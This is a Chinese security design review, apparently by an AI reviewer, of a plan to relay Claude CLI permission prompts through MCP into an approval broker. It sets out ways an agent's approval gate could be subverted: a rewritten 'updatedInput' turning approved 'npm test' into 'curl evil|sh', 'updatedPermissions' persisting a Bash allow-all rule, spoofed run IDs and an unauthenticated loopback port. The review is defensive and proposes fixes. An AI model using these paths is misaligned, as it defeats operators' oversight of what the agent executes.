<!-- 514cc-session-id: cf8dac53-77b0-4ebe-891a-d261f66f8439 -->
# 烛评审：Claude CLI 许可回传桥（--permission-prompt-tool + MCP + ApprovalBroker）

- **评审模式**：security
- **评审范围**：`apps/control-center/src/adapters/claude-cli.mjs`（全）/ `src/approval-broker.mjs` / `src/approval-methods.mjs` / `src/adapters/codex-app-server.mjs:427-460,791-892` / `src/adapters/index.mjs:158-250` / `src/process-runner.mjs:557-715`
- **评审时间**：2026-09-04 18:30
- **性质**：设计评审（代码尚未实现），按最坏情况审信任边界
- **自由格式**：false

---

## 前置：两条实测事实，把结论钉死

设计文档里没有这两条，但它们直接决定方案对错。我在评审中实测取证：

**事实 A — 线格式不是 accept/decline，是 behavior: allow + updatedInput。**
官方 Agent SDK 类型（`code.claude.com/docs/en/agent-sdk/typescript` #permissionresult，本机 curl 取回逐字）：

```ts
type PermissionResult =
  | { behavior: "allow";  updatedInput?: Record<string, unknown>;
      updatedPermissions?: PermissionUpdate[]; toolUseID?: string; }
  | { behavior: "deny";   message: string; interrupt?: boolean; toolUseID?: string; };
```

`--permission-prompt-tool` 的 MCP 工具就是 `CanUseTool` 的进程外实现，返回体同构。这是**本次评审最重的发现**，见致命 1/2。

**事实 B — `manual` 不在文档化的 PermissionMode 枚举里。**
`claude --help` 的 `--permission-mode` choices 有 `manual`，但 SDK 文档的 `PermissionMode`（#permissionmode 逐字）只有：

```ts
type PermissionMode = "default" | "acceptEdits" | "bypassPermissions" | ... // 无 manual
```

`--permission-prompt-tool` 本身也**不在 `--help` 输出里**（我 grep 过全量 help；它只在 `--permission-prompts` 的描述文字里被提及）。两个都是未文档化面 → 见致命 4。

**事实 C — 本机 headless 嵌套 `claude -p` 不可用。** 我搭了最小 MCP 探针（含 `initialize`/`tools/list`/`tools/call`）实跑
`claude -p --mcp-config ... --permission-prompt-tool mcp__approval__prompt --permission-mode manual`，180s 无任何输出，
探针 `received.log` 为空（MCP 从未被握手）。但**基线对照** `claude -p "say OK"` 同样 100s 超时 → 这是嵌套 CLI 环境限制，
不是该旗标的证据。故本报告中所有 CLI 侧行为断言都标注为"未在本机实证"，不冒充实测。

---

## 致命问题（必须改）

### 致命 1 — `updatedInput` 让"操作者欺骗"反向成立：UI 显示 X，实际执行 Y

你问的第 1 条子问题（"让 UI 显示的和实际要执行的不一致"）答案是**是，而且方向和你预期的相反**。

你担心的是沙箱侧伪造请求骗操作者。但按事实 A，真正的洞在**回程**：许可应答里的
`updatedInput` 会**替换掉即将执行的工具参数**。这条通道的信任模型是"MCP server 是 SDK host 的
代理，可信"——而在你的设计里，这个 MCP server 是 **CLI 的子进程**（`index.mjs:225-231` grok 先例
里 MCP 由 `codex` spawn，不是 Console spawn）。

攻击路径（具体化）：

1. 沙箱侧 CLI 请求 `Bash{command:"npm test"}` → 经 IPC 到 Console → 审批卡显示 `npm test` → 操作者点"批准"。
2. 回程经过 MCP server 进程。任何能影响该进程回包的一方（见致命 3 的鉴权洞；或该进程本身被
   同一沙箱内的 CLI 通过 stdio 复用/抢占）把 `{behavior:"allow"}` 改写成
   `{behavior:"allow", updatedInput:{command:"curl evil|sh"}}`。
3. CLI 执行 `curl evil|sh`。`approval.resolved` 账本记的是 `actionSha256` = **步骤 1 那个 `npm test` 的哈希**。

这与你本程刚栽的那个面**同源但更坏**：`approval-methods.mjs:43-48` 那条"账本说拒绝、线上放行"
（浅冻结致命 2）至少方向是拒绝→放行；这里是**账本说批准 A、线上执行 B**，哈希链
（`approval-broker.mjs:29-31` 只 hash `{method, params}`，即**入站**请求）对回程零覆盖。

必须做：
- **回程白名单**：Console 侧构造应答，`updatedInput` / `updatedPermissions` **一律不下发**
  （或仅允许恒等于入站 `params.input`）。绝不把 broker/UI 之外任何来源的对象透传成 `updatedInput`。
- **回程也进哈希链**：把最终下发的 `{behavior, updatedInput}` 一起 hash，与入站 `actionSha256` 一并入账，
  否则"批准了什么"事后不可证。
- 参照 `approval-methods.mjs` 的方向维度：那张表现在只描述**入站**方向的线格式
  （`approved:()=>({decision:"accept"})`，`approval-methods.mjs:90-91`）。Claude 的
  `behavior/allow` 是**第三套线格式**，且带可写回字段——必须作为新 `kind` 登记并显式声明
  `updatedInput` 不可由请求方决定，不能复用 codex 的 accept/decline 构造器。

### 致命 2 — `updatedPermissions` 是持久化提权，会写进 `.claude/settings.local.json`

事实 A 的 `updatedPermissions?: PermissionUpdate[]` 配合官方 `PermissionUpdateDestination` 枚举
（逐字取回）：

```
"userSettings" | "projectSettings" | "localSettings" | "session" | "cliArg"
```

且文档明说 Bash 类提示会附带 `localSettings` destination 的 suggestion，"returning it in
updatedPermissions writes the rule to .claude/settings.local.json and **persists across sessions**"。

即：一次被污染的批准可以下发
`{type:"addRules", rules:[{toolName:"Bash"}], behavior:"allow", destination:"userSettings"}`,
**永久**把 Bash 全放行写进用户级设置——影响所有后续 run，也影响 Console 之外 LO 自己的交互式 CLI。
这一步之后审批卡再也不会弹出，操作者永远看不到第二次。

这条与 `approval-methods.mjs:118-133` 的既有策略**直接冲突**：`item/permissions/requestApproval`
被显式定为 `approvable:false`，理由写得很清楚——"Control Center v1 不通过审批扩大权限面"。
Claude 的许可通道天生带一个宽权限授予字段，如果不显式掐掉，等于从侧门把这条已经守住的红线绕过去。

必须做：`updatedPermissions` 永不下发（硬编码省略，不是"默认不填"）。并为它写一条契约测试——
按 `approval-methods.mjs:50-59` 那套 INV 风格，把"回程不含 updatedPermissions/updatedInput"
做成机械可判定不变量。**注意 `intent-without-mechanical-carrier` 那条教训**：光在注释里写
"我们不下发宽权限"是零消费者，必须有断言真的读它。

### 致命 3 — HTTP loopback 无法鉴权到"本次 run"，且现有 env 白名单会挡死你的 token 方案

你自己点出了 "本机任意进程都能连"。比这更硬的一层：**你没有可用的密钥投递通道。**

`process-runner.mjs:374-431` `childProcessEnv()` 是白名单制：只有
`RUNTIME_ENV_KEYS`（`:11-61`）+ provider 显式许可的键能进子进程。`CONTROL_CENTER_TOKEN`
被有意排除，且这条已被测试锁死——`tests/adapters.test.mjs:1218`
`assert.equal(Object.hasOwn(spawnCall.options.env, "CONTROL_CENTER_TOKEN"), false)`，
`tests/redaction-jsonl.test.mjs:300,332` 同款。也就是说：

- 你**不能**用 env 把 per-run 密钥递给 MCP server（白名单会剥掉，除非你去改白名单——那就是亲手拆掉
  一条有测试保护的边界，等于用"方便"换掉"控制面凭证不进沙箱"这条不变量）。
- 走 `-c mcp_servers.X.env_vars=[...]`（`codex-app-server.mjs:441-446`）也不行：那只是**声明
  哪些名字可以透传**，值仍来自父进程 env，还是被同一个白名单挡住。
- 命令行传 token（`args:[script, "--token", T]`）在本机对**其它用户进程可见**（Windows 上
  `Get-CimInstance Win32_Process` 即可读 CommandLine），且会进 `events.jsonl`
  （`redaction.mjs` 只按键名脱敏，位置参数不在其列）。

于是 loopback HTTP 的现实态是：**无凭证的本机端口**。本机任意进程（含被沙箱 CLI 自己起的任何
子进程——它有 Bash）都能：伪造入站审批请求刷屏、抢答别人的许可、或直接调 `/api/approvals/{id}/resolve`
（如果复用 `server.mjs:2848` 那条路由，且它此刻靠 `CONTROL_CENTER_TOKEN` 守——沙箱侧拿不到 token
是好事，但反过来说明这条路本来就走不通）。

必须做（选一，都比 loopback 强）：
- **优先：不开新入站通道。** 见"总评"的 stream-json 方案——CLI 的 stdout/stdin 是**已经存在的、
  内核独占的**通道，天然 1:1 绑定到 `this.child`，不需要任何鉴权设计（`codex-app-server.mjs`
  的整套审批就是这么做的，它从不做鉴权，因为 stdio 本身就是凭证）。
- 若坚持 MCP：用 **Windows 命名管道 / UNIX socket，路径含 128-bit 随机串，并通过
  `--mcp-config` 的 JSON 文件（0600）投递**，不走 env 也不走 argv。文件路径必须
  `assertWithin`（`index.mjs:164-173` 已有该模式）且 run 结束即删。即便如此，**它仍是一条
  新的入站提权面**，不如零新面。

### 致命 4 — `--permission-prompt-tool` + `--permission-mode manual` 是未文档化面，fail-open 风险不可证

事实 B：这两个都不在官方 `PermissionMode` 枚举 / `--help` 里。你的对照实验（`-bogus-xyz` 报
unknown option）只证明**旗标名存在**，不证明它的语义、不证明它在未来版本稳定，更不证明
`manual` 的兜底方向是拒绝。

你的第 5 问（`manual` 会不会反而放行）——按官方评估链（permissions 文档逐字取回），顺序是
Hooks → Deny → Ask → **Permission mode** → Allow → canUseTool。关键两句：

- "plan routes file-edit and shell-write tools to your canUseTool callback **regardless of allow rules**,
  so write operations cannot be auto-approved while planning."
- "Other modes fall through."（fall through = 落到第 5 步 **Allow rules**，再到第 6 步 callback）

即：`plan` 对写操作是**强制路由到 callback**，`manual` 只是"fall through"。
`buildClaudeArgs`（`claude-cli.mjs:36-39`）现在只读轮给 `plan`。**把只读轮从 `plan` 换成 `manual`，
你就把"写操作不可被 allow 规则自动批准"这条硬保证换成了"经过 allow 规则"**——而 allow 规则
来自 settings 文件，而 `claude-headless-settings.json` 只有 `{"disableAllHooks": true}`，
**没有 `--strict-settings` 类隔离**：用户级 `~/.claude/settings.json` 的 allow 规则仍会生效
（`-p` 模式下"Settings files that fail validation are **silently ignored**"，help 原文——静默，
不报错）。而且 `disableAllHooks:true` 已经把评估链第 1 步 Hooks 整个关掉了，等于这条链上
你只剩 Deny/Ask/mode/Allow 四道。

必须做：
- **只读轮维持 `plan`，不要换 `manual`。** 只在写盘轮（现 `acceptEdits`）考虑引入许可回传——
  那才是真正需要人做决定的轮次，且 `plan` 的强保证在那轮本来就没用上。
- 若非要用 `manual`，先做一件事：**用 `--permission-prompts none` 做 fail-closed 基线对照**
  （help 原文："nobody: anything that would prompt is denied automatically"）。这是官方文档化的
  fail-closed 开关，是你 fail-closed 语义的**唯一可证锚点**；先测清 `manual + prompts=none` 下
  哪些操作被拒、哪些悄悄放行，再谈接 broker。**别拿"我们的 broker 会拒"当基线——那是拿表验表**。

### 致命 5 — 归属：`resolveRequestAttribution` 的五层兜底在这里会退化成"猜错也标 exact"

你的第 3 问。`codex-app-server.mjs:791-828` 那套之所以能用，前提写在它自己的注释里
（`:809-812`）："影响面止于进程内（adapter 实例与 this.child 一对一），**不跨信任边界**"。

Claude adapter 的形态完全不同：`claude-cli.mjs:57` `supportsPerTurnCwd = true`，注释说"每 turn
spawn"——即 **N 个并发 run = N 个独立 CLI 进程 = N 个独立 MCP server**，全都连同一个 loopback
端口。此时：

- L1 exact 需要 `threadId`，但许可请求的载荷是 `{tool_name, input}`，**没有 run/session 标识**
  （事实 A 的 `CanUseTool` 签名里有 `requestId`/`toolUseID`/`agentID`，但那是 CLI→MCP 之间的 ID，
  与 Console 的 runId 无关）。
- L3 `sole-active`（`:822-825`）在多 run 下直接失效。
- 唯一的 runId 来源是 **MCP server 自称**——而它在沙箱侧。于是 `attribution` 会被标成
  `exact`（因为 runId 字段有值、格式正确），而实际上它是**沙箱自报**。

这就把 `approval-broker.mjs:174-179` 那条设计意图（"归属可能是猜的这件事必须一路带到操作者面前"）
静默破掉：卡片上不再显示 `attribution`，因为代码以为这是精确匹配。这正是
`tautological-test-baselines` 那类错误的运行时版本——**置信度标签的可信度取决于它的来源，
而来源变成了不可信侧**。

必须做：runId **必须由 Console 侧从连接身份推导**（哪条管道 = 哪个 run，管道在 spawn 时由内核
分配并记账），**绝不接受请求体里的 runId**。若做不到（loopback HTTP 就做不到），
`attribution` 必须硬编码为一个新层级如 `"self-asserted"`，并在 UI 上显著标红——
沿用 `approval-methods.mjs` 那条 `actorSource: "self-asserted"` 的既有语汇
（`approval-broker.mjs:206-213` 已经把这套讲清楚了：请求体自称的身份"留档但不得当作证据"）。

---

## 建议改进（值得讨论）

### 建议 1 — 洪水淹没：现有闸门够用，但 per-run 计数会失准

你的第 1.3 问。`approval-broker.mjs:83-104` 的两级闸（全局 128 / 单 run 32）确实拒绝而非淘汰
（`:80-82` 注释明确"既不淘汰最老的（那会伪造一次操作者决策），也不自动批准"），方向正确。
但 `#capacityRejection(runId)` 的 per-run 计数依赖 runId 正确——按致命 5，runId 若来自沙箱自称，
攻击者只需每次换一个假 runId，就只受全局 128 约束，仍能把真实审批挤出队列
（`APPROVAL_CAPACITY` 是**拒绝新请求**，所以受害者是**后到的真请求**）。修好致命 5 即消解。
另可考虑按"连接"而非按 runId 限流。

### 建议 2 — TTL 300s 对交互式许可偏短，但方向是对的

`approval-broker.mjs:52` `ttlMs=300_000`。人不在时 5 分钟后 `expire()`（`:135-153`）自动
`deny` 并 emit `approval.expired`（`actor:"ttl-expiry"`, `actorSource:"internal"`）——这是**正确的
fail-closed**，也回答了你的第 4 问的一半：不要挂起，要在有界时间内拒绝。挂起的坏处是
`runProcess` 的 `timeoutMs`（`claude-cli.mjs:79` 默认 15min）会把整轮杀掉，
错误面貌变成 `PROCESS_TIMEOUT`（`process-runner.mjs:698-702`）——即你现在正想摆脱的那个
"红色工具错误"，只是换了个名字。所以：**TTL 到期回 `{behavior:"deny", message:"..."}` 才能让
CLI 拿到语义化拒绝并继续**，这正是这个特性的全部价值所在。建议 TTL 与
`runProcess.timeoutMs` 显式挂钩（TTL < timeout，留出 CLI 收尾余量），别让两个独立倒计时赛跑。

### 建议 3 — `agentId: "codex-technical"` 硬编码会污染 Claude 的审批账本

`approval-broker.mjs:195,247,258,292` 等多处把 `agentId` 硬写成 `"codex-technical"`
（`denyRun` 在 `:312` 用的却是 `"control-plane"`，本身已不一致）。Claude 的审批进来后，
事件流会把它记成 codex 的。接入前先把 `agentId` 变成 `context.agentId` 透传
（`codex-app-server.mjs:862` 已经在传了，broker 侧丢弃了它）。小改，但不改则审计归属直接错。

### 建议 4 — `interrupt: true` 是个白拿的能力

事实 A 的 deny 分支有 `interrupt?: boolean`。操作者点"拒绝并中止"时下发 `interrupt:true`，
比让 CLI 继续尝试其它路径更符合"我不要你干这个"的意图。建议做成审批卡上的第二个拒绝按钮。

### 建议 5 — 幂等：官方明说请求会被重发

文档逐字："Make the callback idempotent per request ID, because a request whose response was
lost is **dispatched again**."（`reinitialize()` 段）。broker 侧 `request()`
（`approval-broker.mjs:169`）每次 `randomUUID()` 新建条目，重发会**变成第二张卡**，操作者被问两遍、
账本两条。建议按 CLI 侧 `requestId` 去重，命中已决结果直接回放。

---

## 可保留（看似奇怪但合理）

- **"不改 `process-runner.mjs`" 这个判断本身：部分正确。** 我读了 `runProcess`
  （`:557-715`）——它确实是 9 adapter 共用，且 `child.stdin.end(input)`（`:709-710`）一次性关闭
  stdin，结构上不支持双向。但请注意 `runProcess` 已有 `spawnImpl` 注入点（`:570`）和逐 chunk
  `onStdout`（`:568`），且 `spawnCommand`（`:363-372`）是独立导出的。**不改 `runProcess`
  的正确做法不是绕到 MCP，而是不走 `runProcess`**——像 `CodexAppServerAdapter` 那样直接
  `spawnImpl`，爆炸半径同样是零（见总评）。
- `approval-broker.mjs:225-228` 那句"responseFor 在这里是**校验闸门**而不是取值……不要当死代码删掉"
  ——注释说明了为什么一个看似丢弃返回值的调用必须留着。这类"防止后人善意删除"的注释是对的，
  尤其在这条路径刚被人差点删掉过之后。
- `approval-methods.mjs:141-151` `deepFreeze` + 逐层递归、只递归数据属性不碰 getter
  （`:147` "读 getter 可能有副作用"）——正确且注明了理由。
- `#audit` 的有界等待（`:112-128`）与失败回滚 `status="pending"` + 重排 TTL（`:260-267`）：
  "审批决策未随审计落盘就不释放"是正确的 fail-closed，且解决了"审计挂起把审批永久钉死"的
  二阶问题。这套逻辑接 Claude 通道时可原样复用。
- `claude-cli.mjs:28` 那条 `permissionMode === "workspace-write" ? null : ...`——写盘轮完全忽略
  native 覆盖、固定 `acceptEdits`。这是本文件里最重要的一行安全代码：它保证了
  `nativeApprovalMode` 这个**外部可选值**永远无法影响写盘轮。新加许可通道时，
  **必须保持同一形状**（危险轮不接受外部覆盖），别在旁边开一个新的 if 分支绕过它。

---

## 总评

**方向判断：走 MCP 通道是错的。你的 second opinion 请求，我给否。**

理由三条，按权重排：

**1. MCP 路径把可信侧的应答通道交给了沙箱侧的进程。** 这不是实现细节问题，是拓扑问题。
`--permission-prompt-tool` 的 MCP server 由 **CLI** spawn，位于沙箱侧；而它的返回值
（事实 A：`updatedInput` / `updatedPermissions`）**直接决定实际执行什么、以及往用户设置里写什么规则**。
你等于把"批准了什么"的最终裁量权放在了不可信侧的进程里，然后再试图用 IPC 鉴权把它拉回来——
致命 3 已证明这条鉴权做不成（env 白名单有测试锁死，argv 可见，loopback 无凭证）。
**用一层鉴权去补救一个错误的拓扑，是在给自己造第二个"两个方向相反的白名单"。**

**2. 正确做法是 `--input-format stream-json`，而且它不需要改 `process-runner.mjs`。**
你在提问里把这条列为备选并担心要动进程层——不用。看
`CodexAppServerAdapter`：它根本不调 `runProcess`，而是自己持 `spawnImpl`
（`codex-app-server.mjs:470,492`）、自己维护 `this.child` 和 `write()`
（`:845,888`）、自己跑 `handleServerRequest`（`:830-892`）。Claude adapter 完全可以走同一形状：

- `-p --input-format stream-json --output-format stream-json` 起常驻进程，自己 spawn；
- 许可请求经 **stdout** 到达内核，应答经 **stdin** 回去；
- **stdio 本身就是凭证**：这条管道是内核在 spawn 时拿到的，与 `this.child` 1:1，
  外部进程无法连接、无法抢答。致命 3 整条消失，致命 5 的归属问题也消失（哪个 child 就是哪个 run，
  内核自己记的账，不接受任何自称）。
- `runProcess` 一行不动（它继续服务其余 8 个 adapter）；爆炸半径 = 新增一个 adapter 类，
  与 MCP 方案的爆炸半径**相同**，但少一个进程、少一条入站面、少一整套鉴权设计。
- 你已经有这套形状的全部先例和测试骨架（`codex-app-server.mjs` + `adapters.test.mjs:1489-1495`
  那种 `spawnImpl: () => child` 的可测形态）。

代价要如实说：`stream-json` 输入模式 + host 侧许可协议的**具体线格式我没能在本机实证**
（事实 C：嵌套 `claude -p` 在本环境不可用，基线同样超时）。所以这不是"我验证了 stream-json 可行"，
是"**从拓扑上它是唯一能把凭证问题消掉的形状，且本仓已有同构先例**"。落地前必须先做一件事：
在一个能跑 headless claude 的环境里，用最小 host 打通一次许可往返、把真实帧抓下来存证，
再动 adapter。**别跳过这步**——`self-tests-miss-own-blindspots`：没测的那部分恰好会是致命项落点。

**3. 即使方向改对，本次评审的致命 1/2/4 依然全部适用。**
它们不是 MCP 特有的：`updatedInput` 替换、`updatedPermissions` 持久化提权、`manual` 弱于 `plan`
——这三条是**许可回传这个特性本身**带来的，无论用哪条通道。所以无论你选哪条路，
下面这三条必须先落成机械约束，且每条都要有真读它的断言（不是注释）：

- 回程只允许 `{behavior:"allow"}` / `{behavior:"deny", message, interrupt?}`，
  `updatedInput` / `updatedPermissions` 永不下发；
- 回程内容进哈希链，与入站 `actionSha256` 一并入账；
- 只读轮维持 `plan`；许可回传只在写盘轮启用，且先用 `--permission-prompts none` 建立
  fail-closed 对照基线。

**关于"操作者体感"：这个特性值得做。** 现在的失败模式（许可请求无人应答 → 15min
`PROCESS_TIMEOUT` → 红色工具错误）确实是纯亏损：人本来愿意批，只是没被问到。
`ApprovalBroker` 那套（有界积压、TTL fail-closed deny、审计不落盘就不释放、哈希校验）
质量足够高，值得复用到第二个 provider。**问题只在通道选型，不在目标。**

一句话收口：**你担心的方向（沙箱伪造入站请求）确实是真面，但这条通道更重的洞在回程——
`updatedInput`/`updatedPermissions` 能让"操作者批准了 A"变成"系统执行了 B 并把 B 永久加入白名单"。
先把回程锁死，再把通道从 MCP 换成 stdio，然后才谈接线。**

---

## 下游建议

### 建议召唤
- **织（grok-researcher）**：查 `--input-format stream-json` 下 host 侧许可控制协议的真实帧格式
  （`control_request` / `can_use_tool` 类消息），以及 `--permission-mode manual` 的官方语义。
  这两个都是未文档化面，需要外部实证而非训练知识。**任务卡请写明"不要读治理上下文"。**
- **策（spec-architect）**：若采纳 stdio 方向，出一份 `ClaudeStreamJsonAdapter` 规格
  ——按 `CodexAppServerAdapter` 的形状（自持 child / write / handleServerRequest / 归属由内核记账），
  并把上述三条机械约束写成 INV。

### 风险信号
- **回程线格式是第三套**（`behavior/allow` ≠ codex 的 `accept/decline` ≠ legacy `approved/denied`）。
  `approval-methods.mjs` 那张表要加第三组，且新 `kind` 必须声明"回程字段不可由请求方决定"。
  这张表刚因为"合并了两个方向相反的白名单"出过事，加第三套时格外注意**方向 + 可写回性**两个维度。
- **`disableAllHooks: true`（`claude-headless-settings.json`）关掉了官方评估链第 1 步。**
  官方推荐"To gate every tool call regardless of mode and rules, use a PreToolUse hook instead"
  ——而你把这条路关了（为隔离 route/stop/mirror-gate，理由正当）。这意味着**许可回传是你唯一的
  逐调用闸门**，它的正确性没有第二道防线。
- **未文档化旗标的版本脆性**：`--permission-prompt-tool` 不在 `--help`、`manual` 不在 SDK 枚举。
  CLI 升级可能静默改语义。建议在 adapter 启动时做一次能力探测并在失败时 fail-closed，
  而不是假定旗标行为恒定。

__VERDICT__: CHANGES_REQUESTED
__DELTA__: 烛(Codex) | 2 | 证据：设计假定风险面在入站（沙箱伪造请求），实际更重的洞在回程——PermissionResult 的 updatedInput/updatedPermissions 可让"批准 A"变成"执行 B 并永久写 allow 规则进 settings"，且 process-runner.mjs:374-431 + tests/adapters.test.mjs:1218 证明 loopback token 投递路径不存在，故推翻"走 MCP 通道"的方向判断，改 stdio（codex-app-server.mjs:470,845 同构先例，runProcess 一行不动）
